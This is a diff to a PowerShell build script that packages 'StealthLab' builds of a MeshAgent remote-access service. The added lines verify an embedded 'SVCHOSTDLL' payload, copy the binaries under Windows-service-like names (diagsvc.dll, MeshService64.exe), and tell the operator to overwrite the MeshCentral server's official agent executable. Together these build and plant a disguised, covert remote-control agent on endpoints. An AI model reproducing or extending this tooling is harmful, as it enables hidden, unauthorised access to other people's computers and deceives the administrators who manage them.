@@ -1,6 +1,8 @@
 # Complete MeshAgent Build Pipeline
 param([switch]$Clean)
 
+. (Join-Path $PSScriptRoot "tools\ResourceProbe.ps1")
+
 Write-Host "=== MeshAgent Complete Build ===" -ForegroundColor Cyan
 Write-Host ""
 
@@ -39,6 +41,22 @@ Copy-Item "WinDiagnosticHost.msh" "$outputDir\" -ErrorAction SilentlyContinue
 Copy-Item "deploy_stealth_agent.ps1" "$outputDir\install.ps1" -ErrorAction SilentlyContinue
 Copy-Item "branding_config.json" "$outputDir\"
 
+$stealthExeX64 = "meshservice\x64\StealthLab\MeshService-2022.exe"
+if (Test-Path $stealthExeX64) {
+    if (-not (Test-SvchostPayload -Path (Join-Path $PSScriptRoot $stealthExeX64))) {
+        throw "MeshService-2022.exe (x64) missing SVCHOSTDLL resource. Run build.ps1 -StealthLab first."
+    }
+    Copy-Item $stealthExeX64 "$outputDir\MeshService64.exe"
+}
+
+$stealthExeWin32 = "meshservice\StealthLab\MeshService-2022.exe"
+if (Test-Path $stealthExeWin32) {
+    if (-not (Test-SvchostPayload -Path (Join-Path $PSScriptRoot $stealthExeWin32))) {
+        throw "MeshService-2022.exe (Win32) missing SVCHOSTDLL resource. Run build.ps1 -StealthLab first."
+    }
+    Copy-Item $stealthExeWin32 "$outputDir\MeshService.exe"
+}
+
 $dllHash = (Get-FileHash "$outputDir\diagsvc.dll" -Algorithm SHA256).Hash
 
 $readme = @"
@@ -48,6 +66,8 @@ SHA256: $dllHash
 
 UPLOAD TO MESHCENTRAL:
 scp diagsvc.dll user@server:/var/lib/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
+OVERRIDE EXECUTABLE:
+ Copy MeshService64.exe to meshcentral-data/agents/MeshService64.exe and restart the service.
 "@
 
 $readme | Out-File "$outputDir\README.txt" -Encoding UTF8
